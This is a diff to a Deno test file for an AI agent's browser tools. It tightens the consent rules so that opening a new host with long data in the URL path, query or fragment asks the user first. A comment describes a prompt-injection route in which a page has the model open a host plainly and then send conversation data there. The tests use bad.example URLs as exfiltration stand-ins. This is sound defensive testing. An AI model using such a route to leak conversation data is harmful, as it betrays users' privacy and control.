@@ -511,7 +511,7 @@ Deno.test("loopy confirmations: only a Yes runs the held action; No, expiry and 
   assertEquals(log, ["run a", "cancel b", "cancel d", "cancel e", "cancel f", "cancel g"]);
 });
 
-Deno.test("loopy browser rules: a new host with long query or fragment data asks first", () => {
+Deno.test("loopy browser rules: a new host with long path, query or fragment data asks first", () => {
   const visited = new Set(["docs.example"]);
   const long = "x".repeat(URL_DATA_LIMIT + 1);
   const short = "x".repeat(URL_DATA_LIMIT);
@@ -525,7 +525,11 @@ Deno.test("loopy browser rules: a new host with long query or fragment data asks
   // The query and the fragment count together (40 + 40 characters).
   const half = "x".repeat(40);
   assertEquals(openNeedsConsent(`https://bad.example/?${half}#${half}`, visited), true);
-  // A host already visited this session (same host, case-insensitive) does not ask.
+  // Data in the path counts too: https://bad.example/<conversation> asks like ?q=<conversation>.
+  assertEquals(openNeedsConsent(`https://bad.example/${long}`, visited), true);
+  assertEquals(openNeedsConsent(`https://bad.example/a/${"x".repeat(40)}?${half}`, visited), true);
+  assertEquals(openNeedsConsent("https://bad.example/wiki/Albert_Einstein", visited), false);
+  // A host the user allowed this session (same host, case-insensitive) does not ask.
   assertEquals(openNeedsConsent(`https://DOCS.example/?q=${long}`, visited), false);
   // Another port is another host.
   assertEquals(openNeedsConsent(`https://docs.example:8443/?q=${long}`, visited), true);
@@ -581,20 +585,24 @@ Deno.test("loopy browser tools: opening a new host with long URL data asks; Yes 
   const again = (await run("browser_open", { url: `https://bad.example/?q=${data}` })).confirm!;
   await confirmations.answer(again.id, true);
   assertEquals(fake.log, [`open https://bad.example/?q=${data}`]);
-  // Visited now: the same host does not ask again this session.
+  // Allowed now: the same host does not ask again this session.
   const next = await run("browser_open", { url: `https://bad.example/?p=${data}` });
   assertEquals(next.confirm, undefined);
-  // A host opened plainly first is visited too; a short query elsewhere never asks.
+  // A host opened plainly first is NOT allowed by that: a page could have the model open it
+  // with no data, then send the data there. It still asks, for the query and for the path.
   await run("browser_open", { url: "https://shop.example/" });
-  assertEquals(
-    (await run("browser_open", { url: `https://shop.example/?q=${data}` })).confirm,
-    undefined,
-  );
+  const viaQuery = (await run("browser_open", { url: `https://shop.example/?q=${data}` })).confirm;
+  assertExists(viaQuery);
+  await confirmations.answer(viaQuery.id, false);
+  const viaPath = (await run("browser_open", { url: `https://shop.example/${data}` })).confirm;
+  assertExists(viaPath);
+  await confirmations.answer(viaPath.id, false);
+  // A short query elsewhere never asks.
   assertEquals(
     (await run("browser_open", { url: "https://new.example/?q=shoes" })).confirm,
     undefined,
   );
-  assertEquals(fake.log.length, 5);
+  assertEquals(fake.log.length, 4);
 });
 
 Deno.test("loopy browser tools: typing refuses secrets and never touches the field", async () => {
